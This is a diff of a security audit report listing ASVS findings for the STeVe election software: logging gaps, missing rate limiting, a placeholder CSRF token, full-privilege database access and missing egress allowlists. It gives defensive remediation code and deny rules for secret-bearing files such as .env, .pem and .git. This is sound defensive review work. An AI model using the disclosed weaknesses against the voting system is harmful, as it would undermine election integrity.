-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.3 |
-| **Files** | v3/server/pages.py:entire file |
-| **Source Reports** | 16.3.3.md |
-| **Related** | - | **Description:**
-
-There is no evidence of rate limiting, anti-automation controls, or logging of potential automated abuse: No request rate tracking, No logging of rapid successive requests, No CAPTCHA or similar controls, No detection of automated voting attempts. Automated attacks against authentication, voting, or election management endpoints cannot be detected through application logs.
-
-**Remediation:**
-
-Implement rate-limit event logging—Implement request rate tracking and log anomalous patterns. Add anti-automation detection and logging mechanisms for authentication, voting, and election management endpoints.
-
----
-
-#### FINDING-185: Assertion Errors Not Caught or Logged at Application Level
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.4 |
-| **Files** | v3/steve/election.py:48, v3/steve/election.py:69, v3/steve/election.py:115, v3/steve/election.py:178, v3/steve/election.py:197, v3/steve/election.py:211, v3/steve/election.py:238 |
-| **Source Reports** | 16.3.4.md |
-| **Related** | - | **Description:**
+**Description:**
 
 Multiple critical operations use assert for state validation. If assertions fail (indicating an unexpected state or security control failure), no structured logging occurs. Security control failures (election in wrong state) produce unstructured stack traces rather than structured security event logs. When running with -O (optimized mode), these checks are completely disabled.
 
 **Remediation:**
 
-Replace assert statements with proper conditional checks that log security events before raising exceptions. Use explicit if statements with structured logging to capture state validation failures as security events.
+Replace assert statements with proper conditional checks that log security events before raising exceptions
 
----
-
-#### FINDING-186: Database Connectivity Failures Not Explicitly Logged
+#### FINDING-195: Database Connectivity Failures Not Explicitly Logged
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.4 |
-| **Files** | v3/steve/election.py:28 |
-| **Source Reports** | 16.3.4.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.4 |
+| Files | v3/steve/election.py:28 |
+| Source Reports | 16.3.4.md |
+| Related Findings | - |
+
+**Description:**
 
 Database connection failures would produce SQLite exceptions without application-level logging. Backend infrastructure failures (database unavailability, file system issues) would not be captured as structured security events.
 
 **Remediation:**
 
-Wrap database connection attempts in try-except blocks with explicit logging of connection failures, including database path and error details, before re-raising or handling the exception.
+Wrap database connection logic with try-except block that logs connection failures with _LOGGER.error() before re-raising
 
 ---
 
-#### FINDING-187: Debug Print Statements with Unsanitized User Input
+#### FINDING-196: No Log Protection Configuration
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | CWE-117 |
-| **ASVS Sections** | 16.4.1 |
-| **Files** | v3/server/pages.py:500, v3/server/pages.py:523 |
-| **Source Reports** | 16.4.1.md |
-| **Related** | FINDING-060 | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.4.2 |
+| Files | v3/server/bin/tally.py:163 |
+| Source Reports | 16.4.2.md |
+| Related Findings | - |
 
-Debug `print()` statements output raw form data including user-controlled input. If stdout is captured to log files (common in containerized deployments), unsanitized user input flows into logs, enabling log injection attacks through the stdout capture mechanism.
+**Description:**
+
+The logging configuration uses basicConfig with no file protection, access control, or integrity measures. Logs are written to stdout/stderr with no write-once/append-only guarantees, file permissions configuration, log rotation with integrity verification, transmission to a protected centralized system, or digital signatures or checksums on log entries.
 
 **Remediation:**
 
-Replace debug print() statements with proper logging using _LOGGER. Apply sanitization to any user-controlled data before logging. If debug output is necessary, use _LOGGER.debug() with sanitized values instead of print() statements.
+Implement separate output handling for sensitive audit data. Ensure voter lists and other sensitive information are written to protected storage with appropriate access controls rather than stdout. Consider implementing data classification and handling policies for different types of output.
 
 ---
 
-#### FINDING-188: No Log Protection Configuration
+#### FINDING-197: No Centralized Logging Configuration in Web Application
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.4.2 |
-| **Files** | v3/server/bin/tally.py:163 |
-| **Source Reports** | 16.4.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.4.2 |
+| Files | v3/server/pages.py |
+| Source Reports | 16.4.2.md |
+| Related Findings | - |
 
-The logging configuration uses `basicConfig` with no file protection, access control, or integrity measures. Logs are written to stdout/stderr with no write-once/append-only guarantees, file permissions configuration, log rotation with integrity verification, transmission to a protected centralized system, or digital signatures or checksums on log entries.
+**Description:**
+
+The web application uses Python's logging module but there is no evidence of log forwarding to a centralized system, log file protection configuration, separate log storage from application server, or log integrity verification. While the infrastructure may provide these protections (e.g., container logging drivers, syslog forwarding), the application code shows no explicit configuration ensuring log protection.
 
 **Remediation:**
 
-Configure structured logging with proper handlers for centralized log collection. Implement log integrity protection using append-only log files or use a log shipping agent with integrity verification. Configure appropriate file permissions for log files and ensure logs are transmitted to a protected centralized system.
+Configure centralized log shipping with integrity verification. Implement log forwarding to a protected centralized system. Configure separate log storage from the application server with appropriate access controls. Add explicit log protection configuration in application code rather than relying solely on infrastructure.
 
 ---
 
-#### FINDING-189: No Centralized Logging Configuration in Web Application
+#### FINDING-198: HTTP 400 responses expose specific validation failure reasons
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.4.2 |
-| **Files** | v3/server/pages.py: |
-| **Source Reports** | 16.4.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.5.1 |
+| Files | v3/server/pages.py:103-110 |
+| Source Reports | 16.5.1.md |
+| Related Findings | - |
 
-The web application uses Python's `logging` module but there is no evidence of log forwarding to a centralized system, log file protection configuration, separate log storage from application server, or log integrity verification. While the infrastructure may provide these protections (e.g., container logging drivers, syslog forwarding), the application code shows no explicit configuration ensuring log protection.
-
-**Remediation:**
-
-Configure centralized logging with log forwarding to a protected system. Implement log file protection configuration including appropriate file permissions, separate log storage from the application server, and log integrity verification mechanisms.
-
----
-
-#### FINDING-190: HTTP 400 responses expose specific validation failure reasons
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.5.1 |
-| **Files** | v3/server/pages.py:103-110 |
-| **Source Reports** | 16.5.1.md |
-| **Related** | - | **Description:**
+**Description:**
 
 The `quart.abort()` calls include descriptive messages ('Missing date', 'Invalid date format', 'Invalid field') that are passed to the default Quart error handler, which may render them in the HTTP response body. While these specific messages are not highly sensitive, the pattern establishes a practice that could lead to information disclosure if applied to more sensitive contexts.
 
@@ -3941,760 +4591,308 @@ Return generic validation error: `quart.abort(400)` and let global error handler
 
 ---
 
-#### FINDING-191: PersonDB failures not handled in admin endpoints
+#### FINDING-199: PersonDB failures not handled in admin endpoints
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.5.2 |
-| **Files** | v3/server/pages.py:286-287 |
-| **Source Reports** | 16.5.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.5.2 |
+| Files | v3/server/pages.py:286-287 |
+| Source Reports | 16.5.2.md |
+| Related Findings | - |
 
-While PersonNotFound is handled gracefully, the PersonDB.open() call itself has no error handling for database connectivity failures. If the database is unavailable, the error propagates unhandled. The admin page becomes completely unavailable if database has connectivity issues, with no graceful degradation or retry.
+**Description:**
+
+While PersonNotFound is handled gracefully, the PersonDB.open() call itself has no error handling for database connectivity failures. If the database is unavailable, the error propagates unhandled. Admin page becomes completely unavailable if database has connectivity issues, with no graceful degradation or retry.
 
 **Remediation:**
 
-Wrap PersonDB.open() and subsequent operations in a try/except block to handle sqlite3.OperationalError and OSError. Log the error, flash a user-friendly message, and redirect to a safe page.
+Add exception handling for PersonDB.open() failures:
+
+try:
+    pdb = steve.persondb.PersonDB.open(DB_FNAME)
+    me = pdb.get_person(result.uid)
+except steve.persondb.PersonNotFound:
+    raise_404(T_BAD_PID, result)
+except (sqlite3.OperationalError, OSError) as e:
+    _LOGGER.error(f'PersonDB unavailable: {e}')
+    await flash_danger('Service temporarily unavailable. Please try again.')
+    return quart.redirect('/', code=303)
 
 ---
 
-#### FINDING-192: CLI tally script has no top-level exception handler
+#### FINDING-200: Partial vote submission without transaction wrapping
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 16.5.4 |
-| **Files** | v3/server/bin/tally.py:166-180 |
-| **Source Reports** | 16.5.4.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.5.3 |
+| Files | v3/server/pages.py:400-422 |
+| Source Reports | 16.5.3.md |
+| Related Findings | - |
 
-The main() function and entry point have no top-level try/except block. While the function handles is_tampered() and calls sys.exit(1), unexpected exceptions (database corruption, permission denied, memory errors) will print full stack traces to stderr and exit ungracefully. Within tally_election, the raise after catching an exception intentionally fails hard but doesn't ensure the error is logged through the logging system (only print()). Full stack traces with file paths and variable values printed to stderr; error details may be lost if not captured by a process manager; no structured error logging for operational monitoring.
+**Description:**
+
+When a voter submits votes for multiple issues simultaneously, each vote is processed individually. If an error occurs on the Nth vote, the first N-1 votes have already been committed to the database. There is no transaction wrapping the entire batch. While re-voting is supported (mitigating data loss), the user receives an error message that doesn't clarify which votes succeeded and which failed. Impact: Voter confusion about partial vote state; potential for inconsistent ballot if voter doesn't retry.
 
 **Remediation:**
 
-Add top-level exception handler to CLI entry point wrapping main() call with try/except to catch KeyboardInterrupt and Exception, logging critical errors before exiting with appropriate exit codes.
+election.db.conn.execute('BEGIN TRANSACTION'); try: for iid, votestring in votes.items(): election.add_vote(result.uid, iid, votestring); election.db.conn.execute('COMMIT'); except Exception as e: election.db.conn.execute('ROLLBACK'); _LOGGER.error(f'Vote batch failed: {e}'); await flash_danger('Error submitting votes. Please try again.'); return quart.redirect(f'/vote-on/{election.eid}', code=303)
 
 ---
 
-#### FINDING-193: Incomplete documentation of application communication needs
+#### FINDING-201: CLI tally script has no top-level exception handler
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.1.1 |
-| **Files** | v3/ARCHITECTURE.md:, v3/docs/schema.md:, v3/server/config.yaml.example:, v3/server/main.py:36-40, v3/server/bin/mail-voters.py:67-73, v3/steve/election.py:37, v3/server/pages.py:560-574 |
-| **Source Reports** | 13.1.1.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 16.5.4 |
+| Files | v3/server/bin/tally.py:166-180 |
+| Source Reports | 16.5.4.md |
+| Related Findings | - |
 
-The application communicates with multiple external services, but there is no comprehensive communication inventory document. The following communication channels were identified through code analysis but are not formally documented in a single reference: 1) ASF OAuth Service (external authentication), 2) SMTP/Email Service (voter notification), 3) SQLite Database (local persistence), 4) LDAP Service (authorization, referenced but not implemented), 5) End-user-provided document filenames (potential SSRF vector). Without comprehensive communication documentation, security teams cannot perform complete threat modeling, firewall rule validation, or network segmentation reviews. Undocumented external dependencies may introduce unmonitored attack surfaces.
+**Description:**
 
-**Remediation:**
-
-Create a dedicated COMMUNICATIONS.md or equivalent document that inventories: All external service endpoints (OAuth, SMTP, LDAP), Protocol, port, and authentication method for each, Direction of communication (inbound/outbound), User-controllable endpoints or file references, Network security requirements (TLS versions, cipher suites)
-
----
-
-#### FINDING-194: No documentation of concurrent connection limits or fallback mechanisms for any service
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.1.2 |
-| **Files** | v3/ARCHITECTURE.md:, v3/steve/election.py:35-37, v3/steve/election.py:39-44, v3/server/pages.py:165-186, v3/server/pages.py:297 |
-| **Source Reports** | 13.1.2.md |
-| **Related** | - | **Description:**
-
-The application interacts with multiple services (SQLite, OAuth, SMTP) but there is no documentation defining maximum concurrent connections, connection pool limits, or behavior when those limits are reached. Database connections are opened per-operation without pooling. Each Election() instantiation opens a new database connection. Web handlers create new Election/PersonDB instances per request without connection management. ARCHITECTURE.md mentions connections without limits. No documentation exists for maximum concurrent SQLite connections, OAuth service connection timeouts/limits, SMTP connection pooling or rate limits, or fallback behavior if any service becomes unavailable. Under high load or during service outages, the application may exhaust file descriptors, memory, or other resources. Without defined limits and fallback mechanisms, a denial-of-service condition could result from legitimate traffic spikes or upstream service degradation.
+The main() function and entry point have no top-level try/except block. While the function handles is_tampered() and calls sys.exit(1), unexpected exceptions (database corruption, permission denied, memory errors) will print full stack traces to stderr and exit ungracefully. Within tally_election, the raise after catching an exception intentionally fails hard but doesn't ensure the error is logged through the logging system (only print()). Full stack traces with file paths and variable values are printed to stderr; error details may be lost if not captured by a process manager; no structured error logging for operational monitoring exists.
 
 **Remediation:**
 
-Document for each service: connection pool size or maximum concurrent connections, queue/backpressure behavior when limits are reached, circuit breaker or fallback patterns. Example configuration: database: max_connections: 10, connection_timeout_ms: 5000, behavior_at_limit: queue; oauth: max_concurrent_requests: 5, timeout_ms: 10000, fallback: deny_login; smtp: max_concurrent_sends: 3, retry_on_failure: false
+Add top-level exception handler to CLI entry point:
 
----
-
-#### FINDING-195: No documented resource-management strategies, timeout settings, or retry logic for external services
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.1.3 |
-| **Files** | v3/ARCHITECTURE.md:, v3/steve/election.py:, v3/server/main.py:37-40, v3/server/bin/mail-voters.py:67-73, v3/server/pages.py:165-186 |
-| **Source Reports** | 13.1.3.md |
-| **Related** | - | **Description:**
-
-The application documentation does not define resource-management strategies for any external system. Code analysis reveals the following gaps: 1. No timeout settings for database operations - SQLite's default timeout for busy/locked databases is 5 seconds, but this is never explicitly configured or documented. 2. No resource-release procedures documented - Database connections are released in some cases but not others. Normal request-serving paths (via load_election decorator) never explicitly close connections. 3. Email sending has no retry or timeout configuration - asfpy.messaging.mail has no timeout, no retry configuration, no error handling per recipient. 4. OAuth callback has no documented timeout - No timeout or failure handling documented for OAuth callback URL. 5. No retry limits, delays, or back-off algorithms documented anywhere. Without defined resource management strategies: database locks could cause indefinite hangs under concurrent access, failed email sends could silently drop voter notifications, OAuth service outages could leave requests hanging, and resource leaks from unclosed connections could degrade availability over time.
-
-**Remediation:**
-
-Create a resource management section in documentation covering: SQLite Database - Timeout: 30 seconds (sqlite3 timeout parameter), Release: Connections closed after each request via context manager, Failure handling: Return 503 if database is locked beyond timeout, Retry: No retries for synchronous operations. OAuth (ASF OAuth) - Timeout: 10 seconds for token exchange, Retry: None (redirect user to retry login), Failure handling: Display error page with retry option. SMTP (Email) - Timeout: 30 seconds per message, Retry: Up to 2 retries with 5-second delay, Back-off: Not applicable (batch script), Failure handling: Log error, continue to next recipient.
-
----
-
-#### FINDING-196: No secrets rotation schedule or lifecycle management documentation
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.1.4 |
-| **Files** | v3/docs/schema.md:, v3/steve/crypto.py:27-29, 32-41, v3/server/config.yaml.example:, v3/server/pages.py:83 |
-| **Source Reports** | 13.1.4.md |
-| **Related** | - | **Description:**
-
-While the application documents what secrets exist and how they are generated, there is no documentation defining a rotation schedule or lifecycle management for any secret. Secrets identified include: (1) Election salts (16 bytes) generated once at election opening, never rotated; (2) Mayvote salts (16 bytes) generated once at election opening, never rotated; (3) Opened keys (32 bytes) derived once for tamper detection; (4) TLS certificate private keys with path documented but no rotation; (5) Session secrets managed by asfquart, not documented; (6) OAuth client credentials referenced but not documented; (7) CSRF tokens currently placeholder ('placeholder'), not a real secret. Documentation exists in schema.md for salt purposes, generation method, key derivation (Argon2), and encryption algorithm (Fernet, planned migration to XChaCha20-Poly1305), but missing rotation schedules for TLS certificates, rotation procedures if election salts are compromised, session secret rotation policy, OAuth credential rotation, impact assessment if secrets are compromised, and classification of secrets by criticality. Without a defined rotation schedule, compromised secrets may remain in use indefinitely. The placeholder CSRF token represents a complete absence of this security control, which could allow cross-site request forgery attacks.
-
-**Remediation:**
-
-Create a secrets management document with the following structure: Secrets Inventory and Rotation Schedule table containing columns for Secret, Criticality, Rotation Schedule, and Rotation Procedure. Include entries for: TLS private key (Critical, Annual or on compromise, Re-issue certificate/deploy/restart); Session signing key (High, Monthly, Update config/restart server); OAuth client secret (High, Annual, Coordinate with ASF OAuth team); Election salts (Medium, N/A single-use per election lifecycle, Cannot rotate once election opened); CSRF tokens (High, Per-session, Automatically generated per session). Add Compromise Response section detailing: If TLS key compromised - Revoke certificate immediately and re-issue; If session key compromised - Rotate key and invalidate all sessions; If election salt compromised - Election integrity may be violated, re-run if possible.
-
----
-
-#### FINDING-197: All application components use identical full-privilege database access
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.2.2 |
-| **Files** | v3/steve/election.py:35-37, v3/steve/persondb.py:25-26, v3/server/bin/create-election.py:31, v3/server/bin/mail-voters.py:28, v3/server/pages.py:40 |
-| **Source Reports** | 13.2.2.md |
-| **Related** | - | **Description:**
-
-All application modules — web handlers, business logic, command-line tools — access the SQLite database with the same full read/write permissions. There is no privilege separation. Web request handlers, election model, PersonDB, and CLI tools all have full access. Specific concerns: (1) The mail-voters.py script only needs READ access to election metadata and voter emails, but has full write access to the database. (2) The voter-facing endpoints (e.g., /vote-on/&lt;eid&gt;) can technically invoke any database operation (create elections, delete data) since the same Election class is used. (3) No OS-level service account separation between the web server and CLI tools. If any component is compromised (e.g., through a web vulnerability), the attacker gains full database access including ability to modify election results, delete elections, or alter voter records. The mail-voters.py script could be leveraged to modify data if compromised.
-
-**Remediation:**
-
-1. For SQLite: Implement application-level privilege separation by using different database wrapper classes with restricted query sets (e.g., VoterDB with read-only access and ALLOWED_QUERIES). 2. For CLI tools, use read-only database connections where write access is not needed (e.g., mail-voters.py should use sqlite3.connect with mode=ro). 3. Document the principle of least privilege for each component and its required access level.
-
----
-
-#### FINDING-198: No allowlist of permitted external resources defined in application configuration
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.2.4 |
-| **Files** | v3/server/config.yaml.example:entire file scope |
-| **Source Reports** | 13.2.4.md |
-| **Related** | - | **Description:**
-
-The configuration schema defines server listening parameters and database location but contains no allowlist section defining permitted OAuth/authentication endpoints (ASF OAuth server), permitted LDAP server addresses, permitted external API endpoints, or blocked internal network ranges (SSRF prevention). The domain context confirms the application communicates with external services (ASF OAuth for authentication, LDAP for authorization), but no configuration mechanism restricts which external systems the application may contact. Without an application-layer allowlist, if any code path allows user-influenced URLs (e.g., OAuth redirect handling, webhook callbacks), there is no defense-in-depth against SSRF or unauthorized outbound communication.
-
-**Remediation:**
-
-Add an explicit allowlist section to the configuration: yaml # Permitted external communication targets allowed_backends: oauth: url: "https://oauth.apache.org" # Only this specific endpoint is permitted ldap: host: "ldaps://ldap.apache.org" port: 636 # No other outbound connections permitted # Network-level restrictions denied_networks: - "169.254.0.0/16" # Link-local - "10.0.0.0/8" # Private - "172.16.0.0/12" # Private - "192.168.0.0/16" # Private - "127.0.0.0/8" # Loopback
-
----
-
-#### FINDING-199: Web server configuration lacks allowlist for permitted outbound request targets
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 13.2.5 |
-| **Files** | v3/server/config.yaml.example:entire file scope |
-| **Source Reports** | 13.2.5.md |
-| **Related** | - | **Description:**
-
-The server configuration (config.yaml.example) only specifies listening parameters (port, TLS certificates) and database location. There is no configuration for allowed outbound request destinations at the web server level, file access restrictions beyond the database path, permitted data load sources, or egress filtering rules. The comment 'Typical usage is that a proxy sits in front of this server' suggests a reverse proxy architecture, but the proxy configuration for egress filtering is not documented or enforced at the application level. The application server itself has no configured restrictions on what resources it may fetch or what systems it may contact.
-
-**Remediation:**
-
-Add server-level egress configuration: yaml server: port: 58383 certfile: localhost.apache.org+3.pem keyfile: localhost.apache.org+3-key.pem # Permitted outbound destinations (egress allowlist) allowed_outbound: - host: "oauth.apache.org" port: 443 protocol: "https" - host: "ldap.apache.org" port: 636 protocol: "ldaps" # File access restrictions allowed_file_paths: - "/opt/steve/data/" - "/opt/steve/certs/" Additionally, document the expected proxy/firewall-level egress controls in a deployment guide.
-
----
-
-#### FINDING-200: Auto-reload capability enabled in standalone mode
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.2 |
-| **Files** | v3/server/main.py:84-91 |
-| **Source Reports** | 13.4.2.md |
-| **Related Findings** | None | **Description:**
-
-The standalone mode uses extra_files for auto-reload capability, which is typically a development/debug feature. While the hot-reload behavior depends on the asfquart.runx() implementation, passing extra_files implies file-watching and automatic restart on changes. Auto-reload in production can cause service disruptions and may expose timing information about server state.
-
-**Remediation:**
-
-Conditionally enable extra_files only when debug mode is explicitly enabled. Remove or disable file-watching capabilities in production deployments.
-
----
-
-#### FINDING-201: Missing debug configuration in example config file
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.2 |
-| **Files** | v3/server/config.yaml.example |
-| **Source Reports** | 13.4.2.md |
-| **Related Findings** | None | **Description:**
-
-The example configuration file lacks a debug setting with a production-safe default (i.e., debug: false). Without this, operators may not realize debug mode controls are needed.
-
-**Remediation:**
-
-Add production-safe defaults to config.yaml.example including debug: false and log_level: WARNING with comments indicating these MUST be false/WARNING in production.
-
----
-
-#### FINDING-202: HTTP TRACE method not explicitly disabled
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.4 |
-| **Files** | v3/server/main.py:entire file, v3/server/config.yaml.example |
-| **Source Reports** | 13.4.4.md |
-| **Related Findings** | None | **Description:**
-
-There is no explicit configuration or middleware to disable the HTTP TRACE method. Neither the application code nor the configuration file addresses TRACE method handling. While Quart/Hypercorn may not support TRACE by default (as it typically only routes methods explicitly defined in decorators), there is no explicit rejection mechanism documented or configured. The reliance on framework defaults without verification creates a gap. If TRACE is supported, an attacker could use it in conjunction with XSS (Cross-Site Tracing) to extract HTTP-only cookies or authentication headers.
-
-**Remediation:**
-
-Add explicit TRACE method rejection middleware:
-
-```python
-@app.before_request
-async def reject_trace():
-    from quart import request, abort
-    if request.method == 'TRACE':
-        abort(405)
-```
-
-Or configure at the reverse proxy level:
-```apache
-# Apache
-TraceEnable off
-```
-
----
-
-#### FINDING-203: Server version headers exposed in HTTP responses
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.6 |
-| **Files** | v3/server/main.py:entire file |
-| **Source Reports** | 13.4.6.md |
-| **Related Findings** | None | **Description:**
-
-There is no configuration to suppress server version headers. Hypercorn (the ASGI server) by default includes a `server: hypercorn-h11` or similar header in responses, and Quart may expose its version in error pages. No middleware or configuration is present to strip these headers. Detailed version information of the ASGI server allows attackers to identify specific vulnerabilities in that version, reducing the effort needed for targeted attacks.
-
-**Remediation:**
-
-Configure Hypercorn to suppress the server header and add an after-request hook to strip version information:
-
-```python
-# In create_app() or via Hypercorn config
-@app.after_request
-async def strip_server_header(response):
-    response.headers.pop('Server', None)
-    response.headers.pop('X-Powered-By', None)
-    return response
-```
-
-For Hypercorn configuration:
-```toml
-# hypercorn.toml
-include_server_header = false
-```
-
----
-
-#### FINDING-204: No Application-Level File Extension Allowlist as Defense-in-Depth
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.7 |
-| **Files** | v3/server/main.py:48 |
-| **Source Reports** | 13.4.7.md |
-| **Related Findings** | None | **Description:**
-
-While static_folder=None disables the default static file serving, there is no application-level middleware or response filter that would enforce a file extension allowlist if any route (in the unseen pages or api modules) serves files dynamically. This means there is no secondary control to prevent serving of .py, .yaml, .db, .pem, .git, or other sensitive extensions if a file-serving endpoint is introduced.
-
-**Remediation:**
-
-Add a response middleware that validates served content types, or add an after_request hook that enforces allowed extensions. Example: Create an after_request handler that checks file extensions against an allowlist (e.g., .html, .css, .js, .png, .jpg, .svg, .ico, .woff2) and returns 404 for unexpected extensions.
-
----
-
-#### FINDING-205: No Reverse Proxy Hardening Configuration for File Extension Filtering
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.7 |
-| **Files** | v3/server/config.yaml.example |
-| **Source Reports** | 13.4.7.md |
-| **Related Findings** | None | **Description:**
-
-The domain context confirms deployment behind reverse proxies (Apache/nginx). However, no example reverse proxy configuration is provided that restricts which file extensions may be served. ASVS 13.4.7 specifically targets web tier configuration, which in a proxy-fronted architecture means the reverse proxy must enforce extension restrictions. Without proxy-level restrictions, requests for .git/, .env, config.yaml, *.db, *.pem, and source files could potentially reach the application layer if any misconfiguration occurs.
-
-**Remediation:**
-
-Provide example reverse proxy configurations that deny access to sensitive file extensions. For nginx: Add location blocks that deny .py, .yaml, .yml, .db, .pem, .key, .sqlite, .git, .env, .cfg, .ini, .log extensions and block access to hidden files/directories. For Apache: Use FilesMatch and DirectoryMatch directives to deny access to these extensions and hidden files.
-
----
-
-#### FINDING-206: Comment indicates known pending migration without documented timeline
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.1 |
-| **Files** | v3/steve/crypto.py:63-64 |
-| **Source Reports** | 15.1.1.md |
-| **Related Findings** | None | **Description:**
-
-The code contains a TODO-style comment indicating a planned migration from Fernet (AES-128-CBC) to XChaCha20-Poly1305, with HKDF parameters already configured for the target algorithm. However, there is no documented timeline for this migration, nor is there a documented assessment of whether the current Fernet implementation has any specific vulnerability requiring urgent migration. Without a documented timeline, this technical debt may persist indefinitely, and stakeholders cannot assess whether the current cryptographic approach meets the application's risk profile.
-
-**Remediation:**
-
-Document the migration plan with a target date and risk assessment of the current implementation. Either migrate to XChaCha20-Poly1305 or update the HKDF info parameter to accurately reflect current Fernet usage.
-
----
-
-#### FINDING-207: No documentation highlighting risky third-party components despite known risks
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.4 |
-| **Files** | Project-wide, election.py |
-| **Source Reports** | 15.1.4.md |
-| **Related Findings** | None | **Description:**
-
-The domain context explicitly notes that 'ezt' is not widely used, which may be a risk factor, yet no formal documentation exists that classifies this or other components according to their risk profile. Based on the ASVS definition of 'risky components' (poorly maintained, unsupported, end-of-life, or history of significant vulnerabilities), the following components warrant documented risk assessment: 'ezt' (not widely used, small maintainer base, niche templating engine), 'easydict' (simple utility, low activity repository), 'asfpy' (ASF-internal library, limited community review), and 'argon2-cffi' (well-maintained but wraps C library via cffi). Without documented risk assessment, teams cannot make informed decisions about whether additional sandboxing is needed for risky components, whether alternatives should be evaluated, what additional testing is required for these components, and appropriate monitoring for vulnerability disclosures.
-
-**Remediation:**
-
-Create 'docs/RISKY_COMPONENTS.md' documenting risk assessment for each component. For 'ezt': Risk Level Medium, risk factors include limited community adoption and small maintainer pool, mitigation is to restrict to rendering pre-validated data only, quarterly review frequency, alternative considered is Jinja2. For 'easydict': Risk Level Low, risk factors include infrequent updates, mitigation is frozen version that could be replaced with dataclasses, annual review frequency. For 'asfpy': Risk Level Low-Medium, risk factors include limited external security review, mitigation is that ASF infrastructure team maintains with organizational trust boundary, review frequency tied to ASF infrastructure releases.
-
----
-
-#### FINDING-208: No documentation highlighting dangerous functionality used in the application
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 15.1.5 |
-| **Files** | v3/steve/election.py:410, v3/steve/crypto.py:91-101, v3/steve/crypto.py:75-88, v3/server/main.py:40-41, v3/steve/crypto.py:63-70 |
-| **Source Reports** | 15.1.5.md |
-| **Related Findings** | None | **Description:**
-
